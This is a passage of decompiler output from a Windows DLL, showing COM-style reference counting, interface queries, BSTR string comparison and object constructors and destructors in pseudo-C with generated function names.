    if ( (*(int (__stdcall **)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(this + 4) + 80))(
           *(_DWORD *)(this + 4),
           *(_DWORD *)(this + 8),
           *(_DWORD *)(this + 12),
           *(_DWORD *)(this + 16),
           *(_DWORD *)(this + 20)) < 0
      && *(_WORD *)(this + 8) != 1 )
    {
      sub_10047F15((VARIANTARG *)(this + 8));
      if ( !*(_DWORD *)(this + 4) )
        sub_1004AEC0(-2147467261);
      if ( (*(int (__stdcall **)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(**(_DWORD **)(this + 4) + 80))(
             *(_DWORD *)(this + 4),
             *(_DWORD *)(this + 8),
             *(_DWORD *)(this + 12),
             *(_DWORD *)(this + 16),
             *(_DWORD *)(this + 20)) < 0 )
      {
        sub_10016441(&pExceptionObject);
        _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
      }
    }
  }
  v5 = -1;
  return VariantClear(&pvarg);
}

//----- (1004831D) --------------------------------------------------------
int __stdcall sub_1004831D(int a1)
{
  InterlockedIncrement((volatile LONG *)(a1 + 4));
  return *(_DWORD *)(a1 + 4);
}

//----- (10048332) --------------------------------------------------------
int __stdcall sub_10048332(volatile LONG *a1)
{
  int result; // eax

  InterlockedDecrement(a1 + 1);
  result = *((_DWORD *)a1 + 1);
  if ( result <= 0 )
  {
    (*(void (__thiscall **)(volatile LONG *, int))(*a1 + 28))(a1, 1);
    return 0;
  }
  return result;
}

//----- (10048358) --------------------------------------------------------
int __stdcall sub_10048358(int a1, void *a2, _DWORD *a3)
{
  if ( !sub_10047EE6(&unk_1008D9C0, a2) && !sub_10047EE6(&unk_1008DA30, a2) )
    return -2147467262;
  *a3 = a1;
  (*(void (__stdcall **)(int))(*(_DWORD *)a1 + 4))(a1);
  return 0;
}

//----- (1004839C) --------------------------------------------------------
int __stdcall sub_1004839C(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)
{
  void *v10; // eax
  int v11; // ecx
  int *v12; // eax
  void *v13; // ecx
  int v14; // eax
  int v15; // eax
  int v16; // edi
  void *v17; // edi
  int v18; // eax
  int v19; // [esp-8h] [ebp-30h] BYREF
  int v20; // [esp-4h] [ebp-2Ch] BYREF
  int v21; // [esp+0h] [ebp-28h] BYREF
  int *v22; // [esp+Ch] [ebp-1Ch]
  void *Block; // [esp+10h] [ebp-18h] BYREF
  int v24; // [esp+14h] [ebp-14h]
  int *v25; // [esp+18h] [ebp-10h]
  int v26; // [esp+24h] [ebp-4h]

  v25 = &v21;
  v24 = 0;
  if ( !*(_DWORD *)(a1 + 8) )
    return 0;
  v26 = 1;
  v10 = operator new(0x20u);
  v11 = v20;
  Block = v10;
  LOBYTE(v26) = 2;
  if ( v10 )
  {
    v12 = (int *)(*(_DWORD *)(a1 + 8) + 4);
    v22 = &v20;
    sub_10046065(v12, &v20);
    LOBYTE(v26) = 2;
    v14 = sub_10048D4C(v13, (int)Block, v20);
  }
  else
  {
    v14 = 0;
  }
  LOBYTE(v26) = 1;
  v20 = v11;
  v19 = v11;
  v22 = &v19;
  sub_1000AC5A(&v19, v14);
  LOBYTE(v26) = 4;
  v15 = **(_DWORD **)(*(_DWORD *)(a1 + 8) + 24);
  LOBYTE(v26) = 1;
  (*(void (**)(void))(v15 + 4))();
  v26 = 0;
  v16 = *(_DWORD *)(a1 + 8);
  if ( *(_WORD *)(v16 + 8) == 9 )
  {
    v17 = *(void **)(v16 + 16);
    Block = v17;
    if ( v17 )
      (*(void (__cdecl **)(void *))(*(_DWORD *)v17 + 4))(v17);
    LOBYTE(v26) = 6;
    if ( v17 )
    {
      v18 = sub_10047C22((int)&Block);
      v24 = (*(int (__cdecl **)(int, int, int, int, int, int, int, int, int))(*(_DWORD *)v18 + 24))(
              v18,
              a2,
              a3,
              a4,
              a5,
              a6,
              a7,
              a8,
              a9);
    }
    LOBYTE(v26) = 0;
    if ( v17 )
      (*(void (__cdecl **)(void *))(*(_DWORD *)v17 + 8))(v17);
  }
  return v24;
}
// 100483F9: variable 'v13' is possibly undefined
// 10048406: variable 'v11' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (100484EE) --------------------------------------------------------
_DWORD *__usercall sub_100484EE@<eax>(int *a1@<eax>, _DWORD *a2@<esi>)
{
  int v2; // eax

  v2 = *a1;
  *a2 = v2;
  if ( v2 )
    InterlockedIncrement((volatile LONG *)(v2 + 8));
  return a2;
}

//----- (10048503) --------------------------------------------------------
_DWORD *__userpurge sub_10048503@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(0xCu);
  if ( v2 )
  {
    v2[1] = 0;
    v2[2] = 1;
    *v2 = a2;
  }
  else
  {
    v2 = 0;
  }
  *a1 = v2;
  if ( !v2 )
    sub_1004AEC0(-2147024882);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10048559) --------------------------------------------------------
volatile LONG **__usercall sub_10048559@<eax>(volatile LONG **a1@<ebx>, volatile LONG **a2@<edi>)
{
  volatile LONG *v2; // eax
  bool v3; // zf

  if ( a2 != a1 )
  {
    if ( *a2 )
    {
      sub_10008E98(*a2);
      *a2 = 0;
    }
    v2 = *a1;
    v3 = *a1 == 0;
    *a2 = *a1;
    if ( !v3 )
      InterlockedIncrement(v2 + 2);
  }
  return a2;
}

//----- (10048582) --------------------------------------------------------
volatile LONG **__userpurge sub_10048582@<eax>(volatile LONG **a1@<edi>, const CHAR *a2)
{
  int v2; // eax
  BSTR *v3; // esi
  BSTR *v4; // eax

  if ( !a2 || (!*a1 ? (v2 = 0) : (v2 = sub_100486A0((int)*a1)), (const CHAR *)v2 != a2) )
  {
    if ( *a1 )
    {
      sub_10008E98(*a1);
      *a1 = 0;
    }
    v3 = (BSTR *)operator new(0xCu);
    if ( v3 )
      v4 = sub_10044DE9(v3, a2);
    else
      v4 = 0;
    *a1 = (volatile LONG *)v4;
    if ( !v4 )
      sub_1004AEC0(-2147024882);
  }
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10048630) --------------------------------------------------------
int __userpurge sub_10048630@<eax>(BSTR **a1@<eax>, BSTR **a2)
{
  BSTR *v2; // ecx
  BSTR *v3; // eax

  v2 = *a1;
  v3 = *a2;
  if ( v2 == *a2 )
    return 0;
  if ( !v2 )
    return -1;
  if ( v3 )
    return sub_100486B4(v3, v2);
  return 1;
}

//----- (100486A0) --------------------------------------------------------
int __usercall sub_100486A0@<eax>(int a1@<esi>)
{
  if ( !*(_DWORD *)(a1 + 4) )
    *(_DWORD *)(a1 + 4) = sub_1004B1D0(*(LPCWCH *)a1);
  return *(_DWORD *)(a1 + 4);
}

//----- (100486B4) --------------------------------------------------------
int __userpurge sub_100486B4@<eax>(BSTR *a1@<eax>, BSTR *a2)
{
  UINT v4; // ebx
  UINT v5; // eax
  UINT v6; // edx
  BSTR v7; // ecx
  BSTR v8; // esi
  OLECHAR v9; // bp
  OLECHAR v10; // di

  if ( !*a2 )
    return -(*a1 != 0);
  if ( !*a1 )
    return 1;
  v4 = SysStringLen(*a2);
  v5 = SysStringLen(*a1);
  v6 = v4;
  if ( v4 > v5 )
    v6 = v5;
  v7 = *a2;
  v8 = *a1;
  while ( v6 )
  {
    v9 = *v8;
    v10 = *v7;
    --v6;
    ++v8;
    ++v7;
    if ( v10 != v9 )
      return *(v7 - 1) - *(v8 - 1);
  }
  if ( v4 >= v5 )
    return v4 != v5;
  else
    return -1;
}

//----- (1004872E) --------------------------------------------------------
_DWORD *__stdcall sub_1004872E(_DWORD *a1, int *a2)
{
  *a1 = off_100933E0;
  sub_100484EE(a2, a1 + 1);
  return a1;
}
// 100933E0: using guessed type int (__thiscall *off_100933E0[2])(void *Block, char);

//----- (10048764) --------------------------------------------------------
BOOL __userpurge sub_10048764@<eax>(int a1@<eax>, int a2)
{
  return sub_10048630((BSTR **)(a2 + 4), (BSTR **)(a1 + 4)) == 0;
}

//----- (100487AB) --------------------------------------------------------
char __thiscall sub_100487AB(int *this, int a2)
{
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // edi
  int v11; // eax
  int v12; // eax
  _DWORD v14[2]; // [esp+Ch] [ebp-50h] BYREF
  _DWORD v15[2]; // [esp+14h] [ebp-48h] BYREF
  _DWORD v16[2]; // [esp+1Ch] [ebp-40h] BYREF
  _DWORD v17[2]; // [esp+24h] [ebp-38h] BYREF
  _DWORD v18[2]; // [esp+2Ch] [ebp-30h] BYREF
  _DWORD v19[2]; // [esp+34h] [ebp-28h] BYREF
  _DWORD v20[2]; // [esp+3Ch] [ebp-20h] BYREF
  _DWORD v21[2]; // [esp+44h] [ebp-18h] BYREF
  int v22; // [esp+4Ch] [ebp-10h]
  int v23; // [esp+58h] [ebp-4h]
  int v24; // [esp+64h] [ebp+8h]
  int v25; // [esp+64h] [ebp+8h]
  int v26; // [esp+64h] [ebp+8h]
  char v27; // [esp+67h] [ebp+Bh]

  v22 = 0;
  v24 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)a2 + 4))(a2, v14);
  v23 = 0;
  v4 = *this;
  v22 = 1;
  v5 = (*(int (__thiscall **)(int *, _DWORD *))(v4 + 4))(this, v15);
  v23 = 1;
  v22 = 3;
  if ( !sub_10048764(v24, v5) )
    goto LABEL_5;
  v25 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)a2 + 8))(a2, v16);
  v23 = 2;
  v6 = *this;
  v22 = 7;
  v7 = (*(int (__thiscall **)(int *, _DWORD *))(v6 + 8))(this, v17);
  v23 = 3;
  v22 = 15;
  if ( !sub_10048764(v25, v7) )
    goto LABEL_5;
  v26 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)a2 + 12))(a2, v18);
  v23 = 4;
  v8 = *this;
  v22 = 31;
  v9 = (*(int (__thiscall **)(int *, _DWORD *))(v8 + 12))(this, v19);
  v23 = 5;
  v22 = 63;
  if ( !sub_10048764(v26, v9) )
    goto LABEL_5;
  v10 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)a2 + 16))(a2, v20);
  v23 = 6;
  v11 = *this;
  v22 = 127;
  v12 = (*(int (__thiscall **)(int *, _DWORD *))(v11 + 16))(this, v21);
  v23 = 7;
  v22 = 255;
  v27 = 1;
  if ( !sub_10048764(v10, v12) )
LABEL_5:
    v27 = 0;
  v23 = 6;
  if ( (v22 & 0x80u) != 0 )
  {
    v22 &= ~0x80u;
    sub_10008F07(v21);
  }
  v23 = 5;
  if ( (v22 & 0x40) != 0 )
  {
    v22 &= ~0x40u;
    sub_10008F07(v20);
  }
  v23 = 4;
  if ( (v22 & 0x20) != 0 )
  {
    v22 &= ~0x20u;
    sub_10008F07(v19);
  }
  v23 = 3;
  if ( (v22 & 0x10) != 0 )
  {
    v22 &= ~0x10u;
    sub_10008F07(v18);
  }
  v23 = 2;
  if ( (v22 & 8) != 0 )
  {
    v22 &= ~8u;
    sub_10008F07(v17);
  }
  v23 = 1;
  if ( (v22 & 4) != 0 )
  {
    v22 &= ~4u;
    sub_10008F07(v16);
  }
  v23 = 0;
  if ( (v22 & 2) != 0 )
  {
    v22 &= ~2u;
    sub_10008F07(v15);
  }
  v23 = -1;
  if ( (v22 & 1) != 0 )
  {
    v22 &= ~1u;
    sub_10008F07(v14);
  }
  return v27;
}
// 100487AB: using guessed type _DWORD var_50[2];
// 100487AB: using guessed type _DWORD var_48[2];
// 100487AB: using guessed type _DWORD var_40[2];
// 100487AB: using guessed type _DWORD var_38[2];
// 100487AB: using guessed type _DWORD var_30[2];
// 100487AB: using guessed type _DWORD var_28[2];
// 100487AB: using guessed type _DWORD var_20[2];
// 100487AB: using guessed type _DWORD var_18[2];

//----- (100489A5) --------------------------------------------------------
BOOL __thiscall sub_100489A5(void *this, int a2)
{
  return (*(unsigned __int8 (__thiscall **)(void *, int))(*(_DWORD *)this + 20))(this, a2) == 0;
}

//----- (100489FC) --------------------------------------------------------
int __thiscall sub_100489FC(_DWORD *this)
{
  return this[2];
}

//----- (10048A00) --------------------------------------------------------
int __stdcall sub_10048A00(int a1, void *a2)
{
  volatile LONG **v2; // eax
  void *v3; // eax
  volatile LONG **v4; // eax
  void *v5; // eax
  volatile LONG **v6; // eax
  void *v7; // eax
  volatile LONG **v8; // eax
  int v10; // [esp+0h] [ebp-24h] BYREF
  volatile LONG **v11; // [esp+Ch] [ebp-18h]
  volatile LONG *v12[2]; // [esp+10h] [ebp-14h] BYREF
  int v13; // [esp+20h] [ebp-4h]

  v12[1] = &v10;
  v13 = 0;
  *(_DWORD *)a1 = &off_10095D78;
  *(_DWORD *)a1 = &off_10095DB4;
  *(_DWORD *)(a1 + 4) = 0;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  v11 = (volatile LONG **)(a1 + 16);
  *(_DWORD *)(a1 + 16) = 0;
  LOBYTE(v13) = 5;
  if ( !a2 )
    sub_1004AEC0(-2147467261);
  v2 = (volatile LONG **)sub_1004A349(a2, v12);
  LOBYTE(v13) = 6;
  sub_10048559(v2, (volatile LONG **)(a1 + 12));
  LOBYTE(v13) = 5;
  if ( v12[0] )
  {
    sub_10008E98(v12[0]);
    v12[0] = 0;
  }
  LOBYTE(v13) = 7;
  v3 = (void *)sub_100460F2((int)&a2);
  v4 = (volatile LONG **)sub_1004A2F1(v3, v12);
  LOBYTE(v13) = 8;
  sub_10048559(v4, v11);
  LOBYTE(v13) = 7;
  if ( v12[0] )
  {
    sub_10008E98(v12[0]);
    v12[0] = 0;
  }
  v13 = 10;
  v5 = (void *)sub_100460F2((int)&a2);
  v6 = (volatile LONG **)sub_1004A3FF(v5, v12);
  LOBYTE(v13) = 11;
  sub_10048559(v6, (volatile LONG **)(a1 + 8));
  LOBYTE(v13) = 10;
  if ( v12[0] )
  {
    sub_10008E98(v12[0]);
    v12[0] = 0;
  }
  v13 = 13;
  v7 = (void *)sub_100460F2((int)&a2);
  v8 = (volatile LONG **)sub_1004A3A4(v7, v12);
  LOBYTE(v13) = 14;
  sub_10048559(v8, (volatile LONG **)(a1 + 4));
  LOBYTE(v13) = 13;
  if ( v12[0] )
  {
    sub_10008E98(v12[0]);
    v12[0] = 0;
  }
  v13 = -1;
  if ( a2 )
    (*(void (__stdcall **)(void *))(*(_DWORD *)a2 + 8))(a2);
  return a1;
}
// 10095D78: using guessed type int (__thiscall *off_10095D78)(void *Block, char);
// 10095DB4: using guessed type int (__thiscall *off_10095DB4)(void *Block, char);

//----- (10048BCB) --------------------------------------------------------
_DWORD *__thiscall sub_10048BCB(_DWORD *Block, char a2)
{
  sub_10048BEE(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10048BEE) --------------------------------------------------------
void *__thiscall sub_10048BEE(_DWORD *this)
{
  void *result; // eax
  volatile LONG *v3; // esi
  volatile LONG *v4; // esi
  volatile LONG *v5; // esi
  volatile LONG *v6; // esi

  result = &loc_10079165;
  *this = &off_10095DB4;
  v3 = (volatile LONG *)this[4];
  if ( v3 )
  {
    result = (void *)sub_10008E98(v3);
    this[4] = 0;
  }
  v4 = (volatile LONG *)this[3];
  if ( v4 )
  {
    result = (void *)sub_10008E98(v4);
    this[3] = 0;
  }
  v5 = (volatile LONG *)this[2];
  if ( v5 )
  {
    result = (void *)sub_10008E98(v5);
    this[2] = 0;
  }
  v6 = (volatile LONG *)this[1];
  if ( v6 )
  {
    result = (void *)sub_10008E98(v6);
    this[1] = 0;
  }
  *this = &off_10095D78;
  return result;
}
// 10095D78: using guessed type int (__thiscall *off_10095D78)(void *Block, char);
// 10095DB4: using guessed type int (__thiscall *off_10095DB4)(void *Block, char);

//----- (10048C70) --------------------------------------------------------
_DWORD *__thiscall sub_10048C70(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 1);
  return a2;
}

//----- (10048CA7) --------------------------------------------------------
_DWORD *__thiscall sub_10048CA7(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 3);
  return a2;
}

//----- (10048CDE) --------------------------------------------------------
_DWORD *__thiscall sub_10048CDE(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 4);
  return a2;
}

//----- (10048D15) --------------------------------------------------------
_DWORD *__thiscall sub_10048D15(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 2);
  return a2;
}

//----- (10048D4C) --------------------------------------------------------
int __thiscall sub_10048D4C(void *this, int a2, int a3)
{
  int v3; // eax
  volatile LONG **v4; // edi
  void *v5; // eax
  volatile LONG **v6; // eax
  void *v7; // eax
  volatile LONG **v8; // eax
  void *v9; // eax
  volatile LONG **v10; // eax
  void *v11; // eax
  volatile LONG **v12; // eax
  int *v13; // esi
  int *v14; // eax
  int *v15; // ecx
  int v17; // [esp+0h] [ebp-3Ch] BYREF
  int v18; // [esp+Ch] [ebp-30h] BYREF
  int v19; // [esp+10h] [ebp-2Ch] BYREF
  int v20; // [esp+14h] [ebp-28h] BYREF
  int v21; // [esp+18h] [ebp-24h] BYREF
  int v22; // [esp+1Ch] [ebp-20h] BYREF
  int pExceptionObject; // [esp+20h] [ebp-1Ch] BYREF
  volatile LONG *v24; // [esp+24h] [ebp-18h] BYREF
  int *v25[2]; // [esp+28h] [ebp-14h] BYREF
  int v26; // [esp+38h] [ebp-4h]

  v25[1] = &v17;
  v26 = 0;
  *(_DWORD *)a2 = &off_10095D94;
  LOBYTE(v26) = 1;
  *(_DWORD *)a2 = &off_10095DD0;
  v3 = a3;
  *(_DWORD *)(a2 + 4) = a3;
  if ( v3 )
    (*(void (__stdcall **)(int))(*(_DWORD *)v3 + 4))(v3);
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 12) = 0;
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 0;
  *(_DWORD *)(a2 + 24) = 0;
  v4 = (volatile LONG **)(a2 + 28);
  *(_DWORD *)(a2 + 28) = 0;
  LOBYTE(v26) = 7;
  sub_1004A598((int)this, (int *)v25, &a3);
  LOBYTE(v26) = 8;
  if ( !a3 || !v25[0] )
  {
    sub_10016441(&v18);
    _CxxThrowException(&v18, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  LOBYTE(v26) = 9;
  v5 = (void *)sub_10046083((int)&a3);
  v6 = (volatile LONG **)sub_10049E30(v5, &v24);
  LOBYTE(v26) = 10;
  sub_10048559(v6, v4);
  LOBYTE(v26) = 9;
  if ( v24 )
  {
    sub_10008E98(v24);
    v24 = 0;
  }
  if ( !sub_10008E70((OLECHAR ***)v4) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v26 = 12;
  v7 = (void *)sub_10046083((int)&a3);
  v8 = (volatile LONG **)sub_10049E88(v7, &v24);
  LOBYTE(v26) = 13;
  sub_10048559(v8, (volatile LONG **)(a2 + 16));
  LOBYTE(v26) = 12;
  if ( v24 )
  {
    sub_10008E98(v24);
    v24 = 0;
  }
  if ( !sub_10008E70((OLECHAR ***)(a2 + 16)) )
  {
    sub_10016441(&v22);
    _CxxThrowException(&v22, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v26 = 15;
  v9 = (void *)sub_1004A494((int)v25);
  v10 = (volatile LONG **)sub_10049CD1(v9, &v24);
  LOBYTE(v26) = 16;
  sub_10048559(v10, (volatile LONG **)(a2 + 20));
  LOBYTE(v26) = 15;
  if ( v24 )
  {
    sub_10008E98(v24);
    v24 = 0;
  }
  if ( !sub_10008E70((OLECHAR ***)(a2 + 20)) )
  {
    sub_10016441(&v21);
    _CxxThrowException(&v21, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v26 = 18;
  v11 = (void *)sub_1004A494((int)v25);
  v12 = (volatile LONG **)sub_10049D7F(v11, &v24);
  LOBYTE(v26) = 19;
  sub_10048559(v12, (volatile LONG **)(a2 + 24));
  LOBYTE(v26) = 18;
  if ( v24 )
  {
    sub_10008E98(v24);
    v24 = 0;
  }
  if ( !sub_10008E70((OLECHAR ***)(a2 + 24)) )
  {
    sub_10016441(&v20);
    _CxxThrowException(&v20, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v26 = 8;
  v13 = v25[0];
  if ( !v25[0] )
    sub_1004AEC0(-2147467261);
  v14 = sub_10049DDA(v25[0], &v24);
  LOBYTE(v26) = 21;
  sub_1004A5FD(v15, (int *)(a2 + 8), v14);
  LOBYTE(v26) = 8;
  if ( v24 )
    (*(void (__stdcall **)(volatile LONG *))(*v24 + 8))(v24);
  if ( !*(_DWORD *)(a2 + 8) )
  {
    sub_10016441(&v19);
    _CxxThrowException(&v19, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  *(_DWORD *)(a2 + 12) = 0;
  LOBYTE(v26) = 7;
  if ( v13 )
    (*(void (__stdcall **)(int *))(*v13 + 8))(v13);
  v26 = -1;
  if ( a3 )
    (*(void (__stdcall **)(int))(*(_DWORD *)a3 + 8))(a3);
  return a2;
}
// 10048DBA: variable 'this' is possibly undefined
// 10048FE0: variable 'v15' is possibly undefined
// 10095D94: using guessed type int (__thiscall *off_10095D94)(void *Block, char);
// 10095DD0: using guessed type int (__thiscall *off_10095DD0)(void *Block, char);

//----- (1004907D) --------------------------------------------------------
_DWORD *__thiscall sub_1004907D(_DWORD *Block, char a2)
{
  sub_100490A0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100490A0) --------------------------------------------------------
int __thiscall sub_100490A0(_DWORD *this)
{
  volatile LONG *v2; // esi
  volatile LONG *v3; // esi
  volatile LONG *v4; // esi
  volatile LONG *v5; // esi
  int v6; // eax
  int result; // eax

  *this = &off_10095DD0;
  v2 = (volatile LONG *)this[7];
  if ( v2 )
  {
    sub_10008E98(v2);
    this[7] = 0;
  }
  v3 = (volatile LONG *)this[6];
  if ( v3 )
  {
    sub_10008E98(v3);
    this[6] = 0;
  }
  v4 = (volatile LONG *)this[5];
  if ( v4 )
  {
    sub_10008E98(v4);
    this[5] = 0;
  }
  v5 = (volatile LONG *)this[4];
  if ( v5 )
  {
    sub_10008E98(v5);
    this[4] = 0;
  }
  v6 = this[2];
  if ( v6 )
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)v6 + 8))(this[2]);
  result = this[1];
  if ( result )
    result = (*(int (__stdcall **)(_DWORD))(*(_DWORD *)result + 8))(this[1]);
  *this = &off_10095D94;
  return result;
}
// 10095D94: using guessed type int (__thiscall *off_10095D94)(void *Block, char);
// 10095DD0: using guessed type int (__thiscall *off_10095DD0)(void *Block, char);

//----- (10049144) --------------------------------------------------------
_DWORD *__thiscall sub_10049144(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 5);
  return a2;
}

//----- (1004917B) --------------------------------------------------------
_DWORD *__thiscall sub_1004917B(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 6);
  return a2;
}

//----- (100491B2) --------------------------------------------------------
_DWORD *__thiscall sub_100491B2(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 4);
  return a2;
}

//----- (100491E9) --------------------------------------------------------
_DWORD *__thiscall sub_100491E9(int *this, _DWORD *a2)
{
  sub_1004872E(a2, this + 7);
  return a2;
}

//----- (10049220) --------------------------------------------------------
_DWORD *__thiscall sub_10049220(int *this, _DWORD *a2)
{
  int *v2; // edi
  int *v3; // eax
  void *v4; // ecx
  int v5; // eax
  void *v7[5]; // [esp-4h] [ebp-30h] BYREF
  int v8; // [esp+10h] [ebp-1Ch] BYREF
  void *pExceptionObject; // [esp+14h] [ebp-18h] BYREF
  int *v10; // [esp+18h] [ebp-14h] BYREF
  int v11; // [esp+1Ch] [ebp-10h]
  int v12; // [esp+28h] [ebp-4h]

  v11 = 0;
  sub_1004A598((int)(this + 1), (int *)&v10, this + 1);
  v12 = 1;
  v2 = v10;
  if ( !v10 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  pExceptionObject = operator new(0x14u);
  LOBYTE(v12) = 2;
  if ( pExceptionObject )
  {
    if ( !v2 )
      sub_1004AEC0(-2147467261);
    v3 = sub_10049D29(v2, &v8);
    LOBYTE(v12) = 3;
    v7[0] = v4;
    v7[4] = v7;
    v11 = 1;
    sub_1004A651((int)v4, (int *)v7, v3);
    v12 = 3;
    v5 = sub_10048A00((int)pExceptionObject, v7[0]);
  }
  else
  {
    v5 = 0;
  }
  v12 = 5;
  sub_1000AB64(a2, v5);
  v11 |= 2u;
  v12 = 1;
  if ( (v11 & 1) != 0 )
  {
    v11 &= ~1u;
    if ( v8 )
      (*(void (__stdcall **)(int))(*(_DWORD *)v8 + 8))(v8);
  }
  LOBYTE(v12) = 0;
  if ( v2 )
    (*(void (__stdcall **)(int *))(*v2 + 8))(v2);
  return a2;
}
// 10049298: variable 'v4' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1004930C) --------------------------------------------------------
_DWORD *__thiscall sub_1004930C(void *this, _DWORD *a2)
{
  int v2; // edi
  int *v3; // esi
  int v4; // eax
  int *v5; // eax
  int v6; // ecx
  int v7; // esi
  int v8; // eax
  int v9; // eax
  int v11; // [esp-10h] [ebp-54h]
  _DWORD *v12; // [esp-Ch] [ebp-50h] BYREF
  _DWORD *v13; // [esp-8h] [ebp-4Ch] BYREF
  int v14; // [esp+0h] [ebp-44h] BYREF
  VARIANTARG pvarg; // [esp+Ch] [ebp-38h] BYREF
  int *v16; // [esp+1Ch] [ebp-28h]
  int v17; // [esp+20h] [ebp-24h] BYREF
  int v18; // [esp+24h] [ebp-20h]
  int v19; // [esp+28h] [ebp-1Ch]
  _DWORD *v20; // [esp+2Ch] [ebp-18h] BYREF
  void *Block; // [esp+30h] [ebp-14h]
  int *v22; // [esp+34h] [ebp-10h]
  int v23; // [esp+40h] [ebp-4h]

  v22 = &v14;
  v2 = (int)this;
  v19 = (int)this;
  v23 = 0;
  v18 = 0;
  sub_1004A6BA(a2);
  v23 = 0;
  v18 = 1;
  VariantInit(&pvarg);
  v23 = 1;
  while ( !*a2 )
  {
    if ( !*(_DWORD *)(v2 + 8) )
      sub_1004AEC0(-2147467261);
    v3 = *(int **)(v2 + 8);
    Block = *(void **)(v2 + 12);
    v4 = sub_10045ED2(v3);
    if ( (int)Block >= v4 )
      break;
    sub_10044EB9((LONG)Block, &pvarg);
    ++*(_DWORD *)(v2 + 12);
    if ( !*(_DWORD *)(v2 + 8) )
      sub_1004AEC0(-2147467261);
    v5 = sub_10045EF9((int *)&::pvarg, *(int **)(v2 + 8), &v17, &pvarg);
    LOBYTE(v23) = 2;
    sub_1004A70A(v6, (int *)&v20, v5);
    LOBYTE(v23) = 4;
    if ( v17 )
      (*(void (__cdecl **)(int))(*(_DWORD *)v17 + 8))(v17);
    Block = &v13;
    v7 = (int)v20;
    v13 = v20;
    if ( v20 )
    {
      v8 = *v20;
      v12 = v20;
      (*(void (**)(void))(v8 + 4))();
    }
    LOBYTE(v23) = 4;
    if ( sub_1004994E((int)v12) )
    {
      LOBYTE(v23) = 6;
      Block = operator new(0x20u);
      LOBYTE(v23) = 7;
      if ( Block )
      {
        v16 = (int *)&v12;
        v12 = (_DWORD *)v7;
        if ( v7 )
        {
          v11 = v7;
          (*(void (**)(void))(*(_DWORD *)v7 + 4))();
        }
        LOBYTE(v23) = 7;
        v9 = sub_1004949F((int)Block, v11);
      }
      else
      {
        v9 = 0;
      }
      LOBYTE(v23) = 6;
      sub_1004AAF0(a2, v9);
      v23 = 4;
      v2 = v19;
    }
    LOBYTE(v23) = 1;
    if ( v7 )
      (*(void (__cdecl **)(int, _DWORD *))(*(_DWORD *)v7 + 8))(v7, v13);
  }
  LOBYTE(v23) = 0;
  VariantClear(&pvarg);
  return a2;
}
// 100493B9: variable 'v6' is possibly undefined
// 1004942A: variable 'v11' is possibly undefined
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1004949F) --------------------------------------------------------
int __stdcall sub_1004949F(int a1, int a2)
{
  volatile LONG **v2; // edi
  int v3; // ecx
  int v4; // ecx
  volatile LONG **v5; // eax
  volatile LONG **v6; // eax
  volatile LONG **v7; // eax
  volatile LONG **v8; // eax
  volatile LONG **v9; // eax
  volatile LONG **v10; // eax
  volatile LONG **v11; // eax
  void *v12; // eax
  volatile LONG **v13; // eax
  void *v14; // eax
  volatile LONG **v15; // eax
  int v16; // ebx
  int v18; // [esp+0h] [ebp-40h] BYREF
  int pExceptionObject; // [esp+Ch] [ebp-34h] BYREF
  volatile LONG **v20; // [esp+10h] [ebp-30h]
  volatile LONG **v21; // [esp+14h] [ebp-2Ch]
  volatile LONG *v22; // [esp+18h] [ebp-28h] BYREF
  volatile LONG **v23; // [esp+1Ch] [ebp-24h] BYREF
  volatile LONG **v24; // [esp+20h] [ebp-20h]
  void *v25; // [esp+24h] [ebp-1Ch] BYREF
  void *v26; // [esp+28h] [ebp-18h] BYREF
  void *v27[2]; // [esp+2Ch] [ebp-14h] BYREF
  int v28; // [esp+3Ch] [ebp-4h]

  v27[1] = &v18;
  v28 = 0;
  *(_DWORD *)a1 = &off_10095D54;
  *(_DWORD *)a1 = &off_10095DF0;
  *(_DWORD *)(a1 + 4) = 0;
  v2 = (volatile LONG **)(a1 + 12);
  *(_DWORD *)(a1 + 12) = 0;
  v24 = (volatile LONG **)(a1 + 16);
  *(_DWORD *)(a1 + 16) = 0;
  v23 = (volatile LONG **)(a1 + 20);
